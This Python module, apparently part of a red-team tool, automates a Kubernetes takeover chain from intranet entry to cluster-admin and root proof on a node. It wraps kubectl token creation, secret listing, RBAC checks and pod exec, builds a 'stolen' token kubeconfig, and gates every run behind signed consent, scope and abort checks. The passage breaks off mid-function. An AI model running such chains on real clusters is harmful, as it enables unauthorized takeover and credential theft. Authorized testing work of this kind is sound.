"""Objective-chain engine: intranet entry → cluster-admin → node root proof.

This module is intentionally separate from ``core/objective.py`` (which hosts
the privesc planning objective).  The public API is re-exported from
``core/objective.py`` so callers keep using ``inkblade.core.objective``.
"""

from __future__ import annotations

import hashlib
import json
import os
import re
import shlex
import subprocess
import sys
import time
import urllib.error
import urllib.request
from dataclasses import dataclass, field
from pathlib import Path
from typing import Any, Callable

from .abort import abort_info, assert_not_aborted
from .evidence import EvidenceStore, Run
from .roe import ExecutionLocked, in_scope, roe_status, window_status

CHAIN_ID = "cluster-takeover-objective"
STAGE_COUNT = 7
FULL_IMPACT = "全影响演示"
_MARKER_RE = re.compile(r"^[A-Za-z0-9][A-Za-z0-9._-]{2,63}$")


class ObjectiveError(Exception):
    pass


class GateRefused(ObjectiveError):
    exit_code = 91


class StageFailed(ObjectiveError):
    pass


class ObjectiveCancelled(ObjectiveError):
    pass


def _sha256(data: bytes | str) -> str:
    if isinstance(data, str):
        data = data.encode("utf-8")
    return hashlib.sha256(data).hexdigest()


def _canonical(doc: Any) -> str:
    return json.dumps(doc, ensure_ascii=False, sort_keys=True, separators=(",", ":"))


def _fingerprint(token: str) -> dict[str, Any]:
    return {"sha256_prefix": _sha256(token)[:16], "last4": token[-4:], "length": len(token)}


def normalize_marker(marker: str) -> tuple[str, str, str]:
    raw = str(marker or "").strip()
    if not _MARKER_RE.match(raw):
        raise ValueError("proof-marker 必须为 3–64 位 [A-Za-z0-9._-]，且以字母/数字开头")
    slug = re.sub(r"[^a-z0-9-]+", "-", raw.lower()).strip("-")[:40].rstrip("-")
    if not slug:
        raise ValueError("proof-marker 无法归一化为 Kubernetes 名称")
    marker_name = raw if raw.startswith("INKBLADE-PROOF-") else f"INKBLADE-PROOF-{raw}"
    return raw, slug, marker_name


def _split_command(command: str) -> list[str]:
    text = str(command or "kubectl").strip()
    candidate = Path(text.strip('"'))
    if candidate.is_file():
        return [str(candidate)]
    if os.name == "nt":
        return [p.strip('"') for p in shlex.split(text, posix=False) if p.strip('"')]
    return shlex.split(text)


def _pick(lang: str, zh: str, en: str) -> str:
    if lang == "zh":
        return zh
    if lang == "en":
        return en
    return f"{zh} / {en}"


# ---------------------------------------------------------------- real kubectl

@dataclass
class KubeCall:
    argv: list[str]
    rc: int
    stdout: str
    stderr: str
    seconds: float

    def as_dict(self) -> dict[str, Any]:
        return {"argv": list(self.argv), "rc": self.rc,
                "stdout": self.stdout[-4000:], "stderr": self.stderr[-2000:],
                "seconds": round(self.seconds, 3),
                "sha256": _sha256(self.stdout + "\0" + self.stderr)}


class KubectlBackend:
    kind = "kubectl"
    real_cluster = True

    def __init__(self, kubectl: str = "kubectl", kubeconfig: str | Path | None = None,
                 timeout: float = 60.0):
        self.command_text = kubectl
        self.argv = _split_command(kubectl)
        self.kubeconfig = str(kubeconfig) if kubeconfig else None
        self.timeout = float(timeout)
        self.call_timeout: float | None = None
        self.calls: list[KubeCall] = []
        self.stage_id = ""

    def _run(self, args: list[str], *, input: str | None = None, token: str | None = None,
             timeout: float | None = None) -> KubeCall:
        cmd = list(self.argv)
        if self.kubeconfig:
            cmd += ["--kubeconfig", self.kubeconfig]
        if token:
            cmd += ["--token", token]
        cmd += list(args)
        shown = list(cmd)
        if token:
            try:
                shown[shown.index(token)] = "<redacted-token>"
            except ValueError:
                pass
        limit = float(timeout or self.call_timeout or self.timeout)
        t0 = time.time()
        try:
            proc = subprocess.run(cmd, input=input, capture_output=True, text=True,
                                  encoding="utf-8", errors="replace",
                                  timeout=max(1.0, limit))
            call = KubeCall(shown, proc.returncode, proc.stdout or "", proc.stderr or "",
                            time.time() - t0)
        except subprocess.TimeoutExpired as exc:
            out = exc.stdout if isinstance(exc.stdout, str) else ""
            err = exc.stderr if isinstance(exc.stderr, str) else ""
            call = KubeCall(shown, 124, out or "",
                            (err or "") + f"\ntimeout after {limit:.1f}s",
                            time.time() - t0)
        except OSError as exc:
            call = KubeCall(shown, 127, "", f"{type(exc).__name__}: {exc}", time.time() - t0)
        self.calls.append(call)
        return call

    def _ok_json(self, call: KubeCall, what: str) -> dict[str, Any]:
        if call.rc != 0:
            raise StageFailed(f"{what} 失败 (rc={call.rc}): {call.stderr.strip()[:500]}")
        try:
            return json.loads(call.stdout or "{}")
        except ValueError as exc:
            raise StageFailed(f"{what} 返回非 JSON: {call.stdout[:300]!r}") from exc

    def with_kubeconfig(self, kubeconfig: str | Path) -> "KubectlBackend":
        clone = KubectlBackend(self.command_text, kubeconfig, timeout=self.timeout)
        clone.calls = self.calls  # one shared, redacted call trace
        return clone

    def kubeconfig_with_token(self, token: str, path: str | Path) -> Path:
        """Write a token-only kubeconfig (no client cert) for SA-scoped calls.

        ``--token`` alone is ignored when the kubeconfig also carries a client
        certificate (kubectl then authenticates as the cert user), so stage 2/3
        must use a real token-authenticated context.
        """
        call = self._run(["config", "view", "--raw", "-o", "json"])
        if call.rc != 0:
            raise StageFailed(f"kubectl config view 失败: {call.stderr.strip()[:400]}")
        doc = json.loads(call.stdout or "{}")
        clusters = doc.get("clusters") or []
        contexts = doc.get("contexts") or []
        current = doc.get("current-context") or ""
        context = next((c for c in contexts if c.get("name") == current),
                       contexts[0] if contexts else None)
        if not context:
            raise StageFailed("kubeconfig 中没有可用的 context")
        cluster_name = (context.get("context") or {}).get("cluster")
        cluster = next((c for c in clusters if c.get("name") == cluster_name),
                       clusters[0] if clusters else None)
        if not cluster:
            raise StageFailed("kubeconfig 中没有可用的 cluster")
        out = {
            "apiVersion": "v1", "kind": "Config",
            "clusters": [{"name": "inkblade-stolen", "cluster": cluster.get("cluster") or {}}],
            "contexts": [{"name": "inkblade-stolen",
                          "context": {"cluster": "inkblade-stolen",
                                      "user": "inkblade-stolen"}}],
            "current-context": "inkblade-stolen",
            "users": [{"name": "inkblade-stolen", "user": {"token": token}}],
        }
        target = Path(path)
        target.parent.mkdir(parents=True, exist_ok=True)
        target.write_text(json.dumps(out, ensure_ascii=False, indent=2), encoding="utf-8")
        try:
            os.chmod(target, 0o600)
        except OSError:
            pass
        return target

    def readyz(self) -> dict[str, Any]:
        call = self._run(["get", "--raw", "/readyz"])
        return {"ok": call.rc == 0 and "ok" in call.stdout.lower(),
                "stdout": call.stdout.strip()[-800:], "stderr": call.stderr.strip()[-400:]}

    def version(self) -> dict[str, Any]:
        call = self._run(["version", "-o", "json"])
        if call.rc != 0:
            return {"ok": False, "error": call.stderr.strip()[:300]}
        try:
            return {"ok": True, "raw": json.loads(call.stdout)}
        except ValueError:
            return {"ok": False, "error": call.stdout[:300]}

    def nodes(self) -> list[dict[str, Any]]:
        doc = self._ok_json(self._run(["get", "nodes", "-o", "json"]), "get nodes")
        out = []
        for item in doc.get("items", []):
            meta = item.get("metadata", {})
            status = item.get("status", {})
            info = status.get("nodeInfo", {})
            addrs = {a.get("type"): a.get("address") for a in status.get("addresses", [])}
            out.append({
                "name": meta.get("name", ""),
                "ready": any(c.get("type") == "Ready" and c.get("status") == "True"
                             for c in status.get("conditions", [])),
                "kubelet": info.get("kubeletVersion"), "os": info.get("osImage"),
                "kernel": info.get("kernelVersion"),
                "containerRuntime": info.get("containerRuntimeVersion"),
                "internalIP": addrs.get("InternalIP"), "labels": meta.get("labels", {}),
            })
        return out

    def namespaces(self) -> list[str]:
        doc = self._ok_json(self._run(["get", "namespaces", "-o", "json"]), "get namespaces")
        return sorted(i.get("metadata", {}).get("name", "") for i in doc.get("items", []))

    def services(self) -> list[dict[str, Any]]:
        doc = self._ok_json(self._run(["get", "services", "-A", "-o", "json"]), "get services")
        out = []
        for item in doc.get("items", []):
            meta, spec = item.get("metadata", {}), item.get("spec", {})
            for port in spec.get("ports", []) or [{}]:
                out.append({"namespace": meta.get("namespace", ""),
                            "name": meta.get("name", ""), "type": spec.get("type", "ClusterIP"),
                            "clusterIP": spec.get("clusterIP"), "port": port.get("port"),
                            "nodePort": port.get("nodePort"),
                            "targetPort": port.get("targetPort")})
        return out

    def get(self, resource: str, name: str | None = None, namespace: str | None = None,
            token: str | None = None) -> dict[str, Any] | None:
        args = ["get", resource]
        if name:
            args.append(name)
        if namespace:
            args += ["-n", namespace]
        args += ["-o", "json"]
        call = self._run(args, token=token)
        if call.rc != 0:
            if "not found" in (call.stderr or "").lower() or "notfound" in (call.stderr or "").lower():
                return None
            raise StageFailed(f"get {resource}/{name or ''} 失败: {call.stderr.strip()[:400]}")
        if not call.stdout.strip():
            return None
        return json.loads(call.stdout)

    def apply(self, manifest: dict[str, Any], *, token: str | None = None) -> dict[str, Any]:
        call = self._run(["apply", "-f", "-", "-o", "json"], input=json.dumps(manifest),
                         token=token)
        return self._ok_json(call, f"apply {manifest.get('kind')}/"
                                  f"{manifest.get('metadata', {}).get('name')}")

    def delete(self, resource: str, name: str, namespace: str | None = None, *,
               token: str | None = None) -> dict[str, Any] | None:
        # kubectl delete only supports `-o name` (not `-o json`) for many
        # resources; asking for JSON makes the delete itself fail.
        args = ["delete", resource, name, "--ignore-not-found=true"]
        if namespace:
            args += ["-n", namespace]
        if resource.rstrip("s") == "namespace":
            args += ["--timeout=120s"]
        call = self._run(args, token=token)
        if call.rc != 0:
            raise StageFailed(f"delete {resource}/{name} 失败: {call.stderr.strip()[:400]}")
        return {"kind": resource, "name": name, "output": call.stdout.strip()[:500]}

    def create_token(self, serviceaccount: str, namespace: str) -> str:
        call = self._run(["create", "token", serviceaccount, "-n", namespace])
        if call.rc != 0 or not call.stdout.strip():
            raise StageFailed(f"create token {namespace}/{serviceaccount} 失败: "
                              f"{call.stderr.strip()[:400]}")
        return call.stdout.strip().splitlines()[-1].strip()

    def whoami(self, token: str | None = None) -> dict[str, Any] | None:
        call = self._run(["auth", "whoami", "-o", "json"], token=token)
        if call.rc != 0:
            return None
        try:
            doc = json.loads(call.stdout)
        except ValueError:
            return None
        status = doc.get("status") if isinstance(doc.get("status"), dict) else doc
        info = status.get("userInfo") if isinstance(status, dict) else None
        if isinstance(info, dict):
            return info
        return status if isinstance(status, dict) else None

    def can_i(self, verb: str, resource: str, *, namespace: str | None = None,
              token: str | None = None, as_sa: str | None = None,
              all_namespaces: bool = False) -> bool:
        args = ["auth", "can-i", verb, resource]
        if namespace:
            args += ["-n", namespace]
        if all_namespaces:
            args.append("--all-namespaces")
        if as_sa:
            args.append(f"--as={as_sa}")
        call = self._run(args, token=token)
        return call.rc == 0 and call.stdout.strip().lower().startswith("yes")

    def exec(self, pod: str, command: list[str], namespace: str, *,
             token: str | None = None) -> KubeCall:
        return self._run(["exec", pod, "-n", namespace, "--", *command], token=token)

    def list_secrets(self, *, token: str | None = None) -> list[dict[str, Any]]:
        doc = self._ok_json(self._run(["get", "secrets", "-A", "-o", "json"], token=token),
                            "get secrets")
        out = []
        for item in doc.get("items", []):
            meta = item.get("metadata", {})
            out.append({"namespace": meta.get("namespace", ""),
                        "name": meta.get("name", ""), "type": item.get("type", "")})
        return sorted(out, key=lambda x: (x["namespace"], x["name"]))

    def clusterrolebindings(self) -> list[str]:
        doc = self._ok_json(self._run(["get", "clusterrolebindings", "-o", "json"]),
                            "get clusterrolebindings")
        return sorted(i.get("metadata", {}).get("name", "") for i in doc.get("items", []))

    def rolebindings(self, namespace: str | None = None) -> list[str]:
        args = ["get", "rolebindings", "-o", "json"]
        args += (["-n", namespace] if namespace else ["-A"])
        doc = self._ok_json(self._run(args), "get rolebindings")
        return sorted(i.get("metadata", {}).get("name", "") for i in doc.get("items", []))

    def pods(self, namespace: str | None = None) -> list[str]:
        args = ["get", "pods", "-o", "json"]
        args += (["-n", namespace] if namespace else ["-A"])
        doc = self._ok_json(self._run(args), "get pods")
        return sorted(i.get("metadata", {}).get("name", "") for i in doc.get("items", []))

    def probe_url(self, url: str, timeout: float = 8.0) -> dict[str, Any]:
        try:
            with urllib.request.urlopen(urllib.request.Request(url, method="GET"),
                                        timeout=timeout) as resp:
                return {"url": url, "status": resp.status,
                        "body": resp.read(1024).decode("utf-8", "replace"), "error": None}
        except urllib.error.HTTPError as exc:
            return {"url": url, "status": exc.code,
                    "body": exc.read(512).decode("utf-8", "replace"), "error": None}
        except (urllib.error.URLError, OSError, TimeoutError) as exc:
            return {"url": url, "status": 0, "body": "",
                    "error": f"{type(exc).__name__}: {exc}"}


# ---------------------------------------------------------------- fake backend

class FakeKubectlBackend:
    """Explicit fake-kubectl fixture (CI / no VM).  Never claims a real cluster."""

    kind = "fake-kubectl"
    real_cluster = False

    def __init__(self, slow_stages: dict[str, float] | None = None):
        self.slow_stages = dict(slow_stages or {})
        self.stage_id = ""
        self.call_timeout = None
        self.calls: list[dict[str, Any]] = []
        self.tokens: dict[str, str] = {}
        self.node_files: dict[str, str] = {}
        self.state: dict[str, Any] = {
            "namespaces": ["default", "kube-system", "inkblade-killchain", "inkblade-proof"],
            "nodes": {"k3s-fake": {
                "name": "k3s-fake", "ready": True, "kubelet": "v1.36.5+k3s1",
                "os": "Alpine Linux v3.24 (fake)", "kernel": "6.18.58-0-virt (fake)",
                "containerRuntime": "containerd://2.3.4-k3s1.36 (fake)",
                "internalIP": "10.0.2.15"}},
            "services": {
                "inkblade-proof/mock-target": {
                    "namespace": "inkblade-proof", "name": "mock-target", "type": "NodePort",
                    "clusterIP": "10.43.41.60", "port": 8000, "nodePort": 30080,
                    "targetPort": 8000},
                "inkblade-killchain/operator-metrics": {
                    "namespace": "inkblade-killchain", "name": "operator-metrics",
                    "type": "ClusterIP", "clusterIP": "10.43.55.10", "port": 8080,
                    "nodePort": None, "targetPort": 8080}},
            "serviceaccounts": {"inkblade-killchain/inkblade-operator": {
                "kind": "ServiceAccount",
                "metadata": {"name": "inkblade-operator", "namespace": "inkblade-killchain",
                             "annotations": {}}}},
            "clusterroles": {"inkblade-operator-broad": {
                "kind": "ClusterRole", "metadata": {"name": "inkblade-operator-broad"},
                "rules": [{"apiGroups": ["rbac.authorization.k8s.io"],
                           "resources": ["*"], "verbs": ["*"]}]}},
            "clusterrolebindings": {"inkblade-operator-broad": {
                "kind": "ClusterRoleBinding", "metadata": {"name": "inkblade-operator-broad"},
                "roleRef": {"kind": "ClusterRole", "name": "inkblade-operator-broad"},
                "subjects": [{"kind": "ServiceAccount", "name": "inkblade-operator",
                              "namespace": "inkblade-killchain"}]}},
            "rolebindings": {}, "pods": {}, "configmaps": {},
            "secrets": {
                "default/default-token-fake": {"namespace": "default",
                                               "name": "default-token-fake", "type": "Opaque"},
                "kube-system/k3s-serving": {"namespace": "kube-system",
                                            "name": "k3s-serving", "type": "kubernetes.io/tls"},
                "kube-system/inkblade-lab-agent-token": {
                    "namespace": "kube-system", "name": "inkblade-lab-agent-token",
                    "type": "Opaque"}},
        }

    def _slow(self) -> None:
        delay = self.slow_stages.get(self.stage_id)
        if delay is None:
            for key, value in self.slow_stages.items():
                if self.stage_id.startswith(key):
                    delay = value
                    break
        if delay:
            time.sleep(delay)

    def _log(self, verb: str, resource: str, namespace: str = "", name: str = "",
             result: str = "ok", *, mutates: bool = False) -> None:
        self.calls.append({"argv": [verb, resource, namespace, name], "rc": 0,
                           "stdout": result, "stderr": "", "seconds": 0.0,
                           "mutates": mutates, "stage": self.stage_id,
                           "sha256": _sha256(result)})

    @staticmethod
    def _norm(resource: str) -> str:
        r = str(resource or "").lower()
        return {"ns": "namespaces", "namespace": "namespaces", "sa": "serviceaccounts",
                "serviceaccount": "serviceaccounts", "clusterrole": "clusterroles",
                "clusterrolebinding": "clusterrolebindings", "rolebinding": "rolebindings",
                "pod": "pods", "configmap": "configmaps", "secret": "secrets",
                "node": "nodes", "service": "services", "deployment": "deployments"}.get(
                    r, r if r.endswith("s") else r + "s")

    @staticmethod
    def _name(obj: dict[str, Any]) -> str:
        return str((obj.get("metadata") or {}).get("name") or "")

    @staticmethod
    def _ns(obj: dict[str, Any]) -> str:
        return str((obj.get("metadata") or {}).get("namespace") or "")

    def readyz(self) -> dict[str, Any]:
        self._slow()
        self._log("get", "--raw", name="/readyz")
        return {"ok": True, "stdout": "ok", "stderr": ""}

    def version(self) -> dict[str, Any]:
        self._slow()
        return {"ok": True, "raw": {"serverVersion": {"gitVersion": "v1.36.5+k3s1",
                                                       "platform": "linux/amd64"}}}

    def nodes(self) -> list[dict[str, Any]]:
        self._slow()
        self._log("get", "nodes")
        return [dict(v) for v in self.state["nodes"].values()]

    def namespaces(self) -> list[str]:
        self._slow()
        self._log("get", "namespaces")
        return sorted(self.state["namespaces"])

    def services(self) -> list[dict[str, Any]]:
        self._slow()
        self._log("get", "services")
        return [dict(v) for v in self.state["services"].values()]

    def get(self, resource: str, name: str | None = None, namespace: str | None = None,
            token: str | None = None) -> dict[str, Any] | None:
        self._slow()
        r = self._norm(resource)
        self._log("get", r, namespace or "", name or "")
        if r == "namespaces":
            if not name:
                return {"items": [{"metadata": {"name": n}} for n in self.state["namespaces"]]}
            return ({"kind": "Namespace", "metadata": {"name": name}}
                    if name in self.state["namespaces"] else None)
        if r == "nodes":
            node = self.state["nodes"].get(name or "")
            return dict(node) if node else None
        if r == "services":
            if name:
                obj = self.state["services"].get(f"{namespace}/{name}")
                return dict(obj) if obj else None
            return {"items": [dict(v) for v in self.state["services"].values()]}
        if r == "secrets":
            if name:
                obj = self.state["secrets"].get(f"{namespace}/{name}")
                return dict(obj) if obj else None
            return {"items": [dict(v) for v in self.state["secrets"].values()]}
        store = self.state.get(r, {})
        key = name if r in ("clusterroles", "clusterrolebindings") else f"{namespace}/{name}"
        obj = store.get(key) if name else None
        return dict(obj) if obj else None

    def apply(self, manifest: dict[str, Any], *, token: str | None = None) -> dict[str, Any]:
        self._slow()
        kind = str(manifest.get("kind") or "")
        r = self._norm(kind)
        name, ns = self._name(manifest), self._ns(manifest)
        self._log("apply", r, ns, name, mutates=True)
        if r == "namespaces":
            if name not in self.state["namespaces"]:
                self.state["namespaces"].append(name)
        elif r in ("clusterroles", "clusterrolebindings"):
            self.state[r][name] = dict(manifest)
        elif r == "serviceaccounts":
            self.state["serviceaccounts"][f"{ns}/{name}"] = dict(manifest)
        elif r == "rolebindings":
            if ns not in self.state["namespaces"]:
                raise StageFailed(f"namespace {ns} not found")
            self.state["rolebindings"][f"{ns}/{name}"] = dict(manifest)
        elif r == "pods":
            if ns not in self.state["namespaces"]:
                raise StageFailed(f"namespace {ns} not found")
            obj = json.loads(json.dumps(manifest))
            obj.setdefault("status", {})["phase"] = "Running"
            obj["spec"]["nodeName"] = "k3s-fake"
            self.state["pods"][f"{ns}/{name}"] = obj
        elif r == "configmaps":
            if ns not in self.state["namespaces"]:
                raise StageFailed(f"namespace {ns} not found")
            self.state["configmaps"][f"{ns}/{name}"] = dict(manifest)
        elif r == "deployments":
            self.state.setdefault("deployments", {})[f"{ns}/{name}"] = dict(manifest)
        else:
            raise StageFailed(f"fake backend 不支持 apply {kind}")
        return json.loads(json.dumps(manifest))

    def delete(self, resource: str, name: str, namespace: str | None = None, *,
               token: str | None = None) -> dict[str, Any] | None:
        self._slow()
        r = self._norm(resource)
        self._log("delete", r, namespace or "", name, mutates=True)
        if r == "namespaces":
            if name not in self.state["namespaces"]:
                return None
            self.state["namespaces"] = [n for n in self.state["namespaces"] if n != name]
            for store_name in ("services", "serviceaccounts", "rolebindings", "pods",
                               "configmaps"):
                self.state[store_name] = {
                    k: v for k, v in self.state.get(store_name, {}).items()
                    if not k.startswith(f"{name}/")}
            return {"kind": "Namespace", "metadata": {"name": name}}
        if r in ("clusterroles", "clusterrolebindings"):
            obj = self.state[r].pop(name, None)
            return dict(obj) if obj else None
        obj = self.state.get(r, {}).pop(f"{namespace}/{name}", None)
        return dict(obj) if obj else None

    def create_token(self, serviceaccount: str, namespace: str) -> str:
        self._slow()
        self._log("create", "token", namespace, serviceaccount)
        raw = f"fake-token-{namespace}-{serviceaccount}-{int(time.time() * 1000)}"
        self.tokens[raw] = f"system:serviceaccount:{namespace}:{serviceaccount}"
        return raw

    def whoami(self, token: str | None = None) -> dict[str, Any] | None:
        self._slow()
        self._log("auth", "whoami")
        if token and token in self.tokens:
            return {"username": self.tokens[token], "uid": "fake-uid",
                    "groups": ["system:serviceaccounts", "system:authenticated"]}
        if token:
            return None
        return {"username": "kubernetes-admin", "groups": ["system:masters"]}

    def can_i(self, verb: str, resource: str, *, namespace: str | None = None,
              token: str | None = None, as_sa: str | None = None,
              all_namespaces: bool = False) -> bool:
        self._slow()
        self._log("auth", f"can-i {verb} {resource}", namespace or "", as_sa or "")
        return token is None or token in self.tokens

    def exec(self, pod: str, command: list[str], namespace: str, *,
             token: str | None = None) -> KubeCall:
        self._slow()
        script = command[-1] if command else ""
        self._log("exec", "pods", namespace, pod)
        if script == "id":
            return KubeCall(["exec", pod, *command], 0,
                            "uid=0(root) gid=0(root) groups=0(root)\n", "", 0.0)
        if script == "cat /host/etc/hostname":
            return KubeCall(["exec", pod, *command], 0, "k3s-fake\n", "", 0.0)
        if script.startswith("ls -ld"):
            return KubeCall(["exec", pod, *command], 0,
                            "drwx------    2 root     root          4096 /host/root\n", "", 0.0)
        write = re.search(r"printf\s+'%s'\s+'([^']*)'\s*>\s*(/host/root/\S+)", script)
        if write:
            content, path = write.group(1), write.group(2)
            self.node_files[path[len("/host"):]] = content
            return KubeCall(["exec", pod, *command], 0,
                            f"{_sha256(content)}  {path}\n", "", 0.0)
        read = re.search(r"\bcat\s+(/host/root/\S+)", script)
        if read:
            path = read.group(1)[len("/host"):]
            if path in self.node_files:
                return KubeCall(["exec", pod, *command], 0, self.node_files[path], "", 0.0)
            return KubeCall(["exec", pod, *command], 1, "",
                            f"cat: {read.group(1)}: No such file\n", 0.0)
        absent = re.search(r"test\s+!\s+-f\s+(/host/root/\S+)", script)
        if absent:
            return KubeCall(["exec", pod, *command],
                            0 if absent.group(1)[len("/host"):] not in self.node_files else 1,
                            "", "", 0.0)
        exists = re.search(r"test\s+-f\s+(/host/root/\S+)", script)
        if exists:
            return KubeCall(["exec", pod, *command],
                            0 if exists.group(1)[len("/host"):] in self.node_files else 1,
                            "", "", 0.0)
        remove = re.search(r"\brm\s+-f\s+(/host/root/\S+)", script)
        if remove:
            self.node_files.pop(remove.group(1)[len("/host"):], None)
            return KubeCall(["exec", pod, *command], 0, "", "", 0.0)
        return KubeCall(["exec", pod, *command], 0, "", "", 0.0)

    def list_secrets(self, *, token: str | None = None) -> list[dict[str, Any]]:
        self._slow()
        self._log("get", "secrets", name="--all-namespaces")
        return sorted((dict(v) for v in self.state["secrets"].values()),
                      key=lambda x: (x["namespace"], x["name"]))

    def clusterrolebindings(self) -> list[str]:
        self._slow()
        return sorted(self.state["clusterrolebindings"])

    def rolebindings(self, namespace: str | None = None) -> list[str]:
        self._slow()
        return sorted(k.split("/", 1)[1] for k in self.state["rolebindings"]
                      if namespace is None or k.startswith(f"{namespace}/"))

    def pods(self, namespace: str | None = None) -> list[str]:
        self._slow()
        return sorted(k.split("/", 1)[1] for k in self.state["pods"]
                      if namespace is None or k.startswith(f"{namespace}/"))

    def probe_url(self, url: str, timeout: float = 8.0) -> dict[str, Any]:
        self._log("http", "probe", name=url)
        return {"url": url, "status": 200, "body": "fake-kubectl entry probe: 200",
                "error": None, "simulated": True}


# ---------------------------------------------------------------- chain loading

def load_objective(chains_dir: Path | str, chain_id: str = CHAIN_ID) -> dict[str, Any]:
    from .chains import load_chains

    chains = load_chains(chains_dir)
    if chain_id not in chains:
        raise ValueError(f"objective chain {chain_id} 不存在于 {chains_dir}")
    chain = chains[chain_id]
    obj = chain.get("objective")
    if not isinstance(obj, dict):
        raise ValueError(f"{chain_id}: 缺少 objective 段")
    stages = obj.get("stages")
    if not isinstance(stages, list) or len(stages) != STAGE_COUNT:
        raise ValueError(f"{chain_id}: objective.stages 必须为 {STAGE_COUNT} 段")
    ids: list[str] = []
    for i, stage in enumerate(stages, start=1):
        for key in ("index", "id", "module", "title", "primitive", "writes",
                    "preconditions", "backup_targets", "success_evidence",
                    "fallback", "timeout_s", "detection_rules"):
            if key not in stage:
                raise ValueError(f"{chain_id}: stage {i} 缺字段 {key}")
        if stage["index"] != i:
            raise ValueError(f"{chain_id}: stage 序号不连续（{stage['index']} != {i}）")
        if not str(stage["id"]).startswith(f"stage-{i}-"):
            raise ValueError(f"{chain_id}: stage id 命名必须为 stage-<n>-<name>")
        if stage["id"] in ids:
            raise ValueError(f"{chain_id}: stage id 重复 {stage['id']}")
        ids.append(stage["id"])
        if not isinstance(stage["title"], dict) or {"zh", "en"} - set(stage["title"]):
            raise ValueError(f"{chain_id}: stage {stage['id']} title 须含 zh/en")
        if bool(stage["writes"]) and not stage["backup_targets"]:
            raise ValueError(f"{chain_id}: 写阶段 {stage['id']} 缺少 backup_targets")
        if float(stage["timeout_s"]) <= 0:
            raise ValueError(f"{chain_id}: stage {stage['id']} timeout_s 必须 > 0")
    modules = {st["module"] for st in stages}
    step_modules = {st["module"] for st in chain.get("steps", [])}
    if modules != step_modules:
        raise ValueError(f"{chain_id}: objective.stages 与 steps 模块不一致")
    return chain


# ---------------------------------------------------------------- gates

def _gate(name: str, detail: str) -> dict[str, Any]:
    return {"gate": name, "status": "pass", "detail": detail}


def _refuse(gate: str, detail: str) -> None:
    raise GateRefused(f"[{gate}] {detail}")


def check_gates(store: EvidenceStore, session, chain: dict[str, Any], namespace: str,
                *, host: str | None = None, auto_approve: bool = False) -> dict[str, Any]:
    if abort_info(store).get("requested"):
        _refuse("紧急停止", "工作区已请求紧急停止；请先 `inkblade abort --clear`")
    try:
        assert_not_aborted(store)
    except ExecutionLocked as exc:
        _refuse("紧急停止", str(exc))
    if roe_status(store) != "complete":
        _refuse("授权闸门", "工作区授权未完成或 consent 签名校验失败")
    consent = store.consent() or {}
    fields = consent.get("fields") or {}
    level = str(fields.get("level") or "")
    if level != FULL_IMPACT:
        _refuse("授权闸门", f"目标链要求 {FULL_IMPACT}，当前授权为 {level or '未声明'}")
    if not session.can("execute"):
        _refuse("授权闸门", f"{session.name}({session.role}) 无 execute 权限")
    ok_window, window_detail = window_status(fields)
    if not ok_window:
        _refuse("授权闸门", f"授权时间窗外：{window_detail}")
    gates = [_gate("授权闸门", f"level={level}；窗口={window_detail}")]

    namespaces = [str(n) for n in (fields.get("namespaces") or [])]
    if namespace not in namespaces:
        _refuse("范围闸门", f"namespace={namespace} 不在授权范围 {namespaces}")
    if host and not in_scope(store, target_ns=None, target_addr=host):
        _refuse("范围闸门", f"host={host} 不在授权 CIDR {fields.get('cidrs', [])}")
    gates.append(_gate("范围闸门", f"namespace={namespace}；host={host or '未声明'}"))

    write_stages = [s for s in chain["objective"]["stages"] if s["writes"]]
    missing = [s["id"] for s in write_stages if not s.get("backup_targets")]
    if missing:
        _refuse("备份闸门", f"写阶段缺少 backup_targets: {missing}")
    backup_dir = store.ws_dir / "objective-backups"
    try:
        backup_dir.mkdir(parents=True, exist_ok=True)
        probe = backup_dir / ".gate"
        probe.write_text(str(time.time()), encoding="utf-8")
        probe.unlink(missing_ok=True)
    except OSError as exc:
        _refuse("备份闸门", f"备份目录不可写: {exc}")
    gates.append(_gate("备份闸门", f"{len(write_stages)} 个写阶段均有快照目标；目录可写"))

    auto_allowed = bool(level == FULL_IMPACT and session.role == "lead")
    if auto_approve and not auto_allowed:
        _refuse("授权闸门", "--auto-approve 仅限 level=全影响演示 且 role=lead")
    return {"ok": True, "gates": gates, "auto_approve_allowed": auto_allowed,
            "level": level, "namespaces": namespaces,
            "cidrs": list(fields.get("cidrs") or []), "window": window_detail,
            "consent_sha256": consent.get("sha256")}


# ---------------------------------------------------------------- stage context

@dataclass
class _Ctx:
    backend: Any
    store: EvidenceStore
    run: Run
    session: Any
    chain: dict[str, Any]
    marker: str
    slug: str
    marker_name: str
    namespace: str
    test_namespace: str
    pwn_rb: str
    pwn_crb: str
    pwn_pod: str
    node_path: str
    pod_image: str
    entry_url: str | None
    cleanup_fixture: bool
    actions: list[dict[str, Any]] = field(default_factory=list)
    originals: dict[str, Any] = field(default_factory=dict)
    token: str | None = None
    token_backend: Any = None
    token_kubeconfig: str | None = None
    stage_evidence: dict[str, Any] = field(default_factory=dict)
    stage_id: str = ""

    @property
    def node_path_in_pod(self) -> str:
        return "/host" + self.node_path

    @property
    def tb(self) -> Any:
        return self.token_backend or self.backend

    def _token_arg(self, backend: Any) -> str | None:
        # Fake backend uses in-process tokens; the real token-scoped backend
        # already carries the token in its kubeconfig.
        return self.token if backend is self.backend else None

    def tb_whoami(self) -> dict[str, Any] | None:
        return self.tb.whoami(self._token_arg(self.tb))

    def tb_can_i(self, verb: str, resource: str, *, namespace: str | None = None,
                 all_namespaces: bool = False) -> bool:
        return self.tb.can_i(verb, resource, namespace=namespace,
                             token=self._token_arg(self.tb),
                             all_namespaces=all_namespaces)

    def tb_apply(self, manifest: dict[str, Any]) -> dict[str, Any]:
        return self.tb.apply(manifest, token=self._token_arg(self.tb))

    def tb_get(self, resource: str, name: str | None = None,
               namespace: str | None = None) -> dict[str, Any] | None:
        return self.tb.get(resource, name, namespace=namespace,
                           token=self._token_arg(self.tb))

    def tb_list_secrets(self) -> list[dict[str, Any]]:
        return self.tb.list_secrets(token=self._token_arg(self.tb))

    def action(self, verb: str, resource: str, namespace: str = "", name: str = "",
               result: Any = "", *, mutates: bool = False) -> None:
        payload = result if isinstance(result, str) else _canonical(result)
        self.actions.append({
            "stage": self.stage_id, "verb": verb, "resource": resource,
            "namespace": namespace, "name": name,
            "result": str(payload)[:300], "mutates": bool(mutates), "at": time.time(),
            "sha256": _sha256(payload)})

    def require_token(self) -> str:
        if not self.token:
            raise StageFailed("凭据阶段未产出 token")
        return self.token

    def ensure_cluster_admin(self) -> None:
        self.require_token()
        if not (self.tb_can_i("*", "*", all_namespaces=True)
                or (self.tb_can_i("create", "namespaces")
